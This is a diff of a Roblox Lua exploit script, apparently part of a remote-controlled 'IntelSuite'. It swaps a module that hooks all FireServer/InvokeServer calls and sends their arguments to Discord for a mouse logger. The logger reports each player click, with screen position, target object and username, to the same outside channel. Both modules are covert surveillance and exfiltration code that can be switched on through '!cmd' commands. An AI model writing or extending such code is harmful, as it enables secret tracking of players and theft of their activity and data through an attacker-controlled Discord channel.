@@ -442,62 +442,52 @@ task.spawn(function()
 end)
 
 -- ============================================================
--- MODULE 10: Remote Spy Logger
--- Hooks all RemoteEvent:FireServer() and RemoteFunction:InvokeServer()
--- Logs remote name + args to Discord
--- Activate via !cmd remotespy
+-- MODULE 11: Mouse Logger
+-- Logs mouse clicks + screen position every 30s
+-- Also logs every left/right click instantly
 -- ============================================================
-local function startRemoteSpy()
-    if getgenv().IntelSuite.RemoteSpyActive then
-        send("REMOTE SPY", "Already active.", 16776960)
+local function startMouseLogger()
+    if getgenv().IntelSuite.MouseLogActive then
+        send("MOUSE LOG", "Already active.", 16776960)
         return
     end
-    getgenv().IntelSuite.RemoteSpyActive = true
+    getgenv().IntelSuite.MouseLogActive = true
 
-    local oldNamecall
-    oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
-        local method = getnamecallmethod()
-        local args = {...}
+    local mouse = LocalPlayer:GetMouse()
 
-        if method == "FireServer" or method == "InvokeServer" then
-            pcall(function()
-                if not getgenv().IntelSuite.IsActive then return end
-                local remoteName = tostring(self.Name)
-                local remotePath = tostring(self:GetFullName())
-
-                -- Build args string
-                local argStrs = {}
-                for i, v in ipairs(args) do
-                    local s = ""
-                    pcall(function()
-                        if type(v) == "table" then
-                            s = HttpService:JSONEncode(v)
-                        else
-                            s = tostring(v)
-                        end
-                    end)
-                    table.insert(argStrs, "[" .. i .. "] " .. s:sub(1, 100))
-                    if #argStrs >= 5 then break end
-                end
-
-                local argStr = #argStrs > 0 and table.concat(argStrs, "\n") or "none"
-
-                send("REMOTE SPY",
-                    "**Remote:** " .. remoteName ..
-                    "\n**Path:** " .. remotePath ..
-                    "\n**Method:** " .. method ..
-                    "\n**Args:**\n```" .. argStr:sub(1, 800) .. "```",
-                    16711935
-                )
-            end)
-        end
-
-        return oldNamecall(self, ...)
+    -- Log every left click
+    mouse.Button1Down:Connect(function()
+        if not getgenv().IntelSuite.IsActive then return end
+        pcall(function()
+            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
+            send("MOUSE CLICK",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Button:** Left Click" ..
+                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
+                "\n**Target:** " .. target,
+                8388736
+            )
+        end)
     end)
 
-    send("REMOTE SPY", "Now hooking all FireServer + InvokeServer calls.\n**User:** " .. LocalPlayer.Name, 65280)
+    -- Log every right click
+    mouse.Button2Down:Connect(function()
+        if not getgenv().IntelSuite.IsActive then return end
+        pcall(function()
+            local target = mouse.Target and tostring(mouse.Target:GetFullName()) or "nil"
+            send("MOUSE CLICK",
+                "**User:** " .. LocalPlayer.Name ..
+                "\n**Button:** Right Click" ..
+                "\n**Position:** " .. tostring(mouse.X) .. ", " .. tostring(mouse.Y) ..
+                "\n**Target:** " .. target,
+                8388736
+            )
+        end)
+    end)
+
+    send("MOUSE LOG", "Now logging all mouse clicks.\n**User:** " .. LocalPlayer.Name, 65280)
 end
 
--- Store for !cmd remotespy
-getgenv().IntelSuite.RemoteSpyActive = false
-getgenv().IntelSuite.StartRemoteSpy = startRemoteSpy
+-- Store for !cmd mouselog
+getgenv().IntelSuite.MouseLogActive = false
+getgenv().IntelSuite.StartMouseLogger = startMouseLogger
